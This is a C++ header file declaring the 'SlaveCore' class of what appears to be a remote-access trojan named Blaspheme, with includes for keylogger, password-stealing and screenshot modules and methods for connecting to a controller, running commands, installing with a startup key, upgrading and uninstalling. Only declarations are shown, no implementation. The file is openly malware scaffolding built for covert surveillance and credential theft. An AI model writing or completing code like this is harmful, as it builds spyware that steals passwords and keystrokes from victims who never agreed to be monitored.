#ifndef _SLAVE_CORE_
#define _SLAVE_CORE_

#include <common/NonCopyable.hpp>
#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/protocol/Authentication.hpp>
#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <malicious/Keylogger.hpp>
#include <malicious/Passwords.hpp>
#include <malicious/Screenshot.hpp>
#include "CommandDispatcher.hpp"
#include "ProgramStart.hpp"

namespace Inhibition
{
    class SlaveCore : public Common::NonCopyable
    {
        public:

            SlaveCore(Blaspheme::ConnectionInfo info);
			~SlaveCore();
			void exit();
            bool connect();
            bool acquire_stream();
            bool process_command();
            bool exiting();
            void disconnect();
            bool uninstall();
            void upgrade();
            const std::string& getInstallPath();

			const Blaspheme::ConnectionInfo& getConnection() const;
            void setConnection(const Blaspheme::ConnectionInfo& info);
			Blaspheme::Session& getSession();

        private:
			
			bool exited;

            Blaspheme::Session session;
            Malicious::Screenshot screenshot;
            CommandDispatch dispatcher;

            std::string dllPath;
            std::string keylogPath;
            std::string installPath;
			ProgramStartupKey startup;
    };
    
} // Inhibition

#endif // _SLAVE_CORE_
